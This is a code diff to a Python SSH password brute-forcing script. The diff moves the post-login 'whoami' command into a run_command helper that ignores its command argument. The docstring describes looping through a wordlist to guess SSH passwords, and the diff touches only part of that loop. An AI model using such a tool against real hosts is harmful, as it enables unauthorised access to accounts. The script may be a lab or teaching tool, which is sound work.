@@ -139,13 +139,32 @@ def establish_connection(
         ssh.close()
 
 
+def run_command(ssh_client: paramiko.SSHClient, command: str):
+    """
+    Executes command via ssh client.
+
+    Args:
+        ssh_client (paramiko.SSHClient): SSHClient to execut command
+        command (str): Command to execute
+    """
+    log_msg(f"nExecuting command {command}...")
+    stdin, stdout, stderr = ssh_client.exec_command("whoami")
+    stdout_outlines = stdout.readlines()
+    stdout_resp = "".join(stdout_outlines)
+    log_msg(f"Command response: {stdout_resp}")
+    stderr_outlines = stderr.readlines()
+    stderr_resp = "".join(stderr_outlines)
+    if stderr_resp:
+        log_msg(f"Command error response: {stderr_resp}", "ERROR")
+
+
 def exec_connections(args: argparse.Namespace):
     """
     Based on provided Command-line arguments, it will:
         1. get the list of words used as passwords
         1. for each word try to establish a ssh connection
         1. if connection established, try to run "whoami"
-        1. closes connection
+        1. closes ssh connection
 
     Args:
         args (argparse.Namespace): Passed args on script run
@@ -159,16 +178,9 @@ def exec_connections(args: argparse.Namespace):
         if not ssh_client:
             continue
         log_msg(
-            f"Connection {index} established! Password -> {word}\nExecuting command 'whoami'..."
+            f"Connection {index} established! Password -> {word}"
         )
-        stdin, stdout, stderr = ssh_client.exec_command("whoami")
-        stdout_outlines = stdout.readlines()
-        stdout_resp = "".join(stdout_outlines)
-        log_msg(f"Command response: {stdout_resp}")
-        stderr_outlines = stderr.readlines()
-        stderr_resp = "".join(stderr_outlines)
-        if stderr_resp:
-            log_msg(f"Command error response: {stderr_resp}", "ERROR")
+        run_command(ssh_client, "whoami")
         log_msg("Closing SSH Client...")
         ssh_client.close()
         break
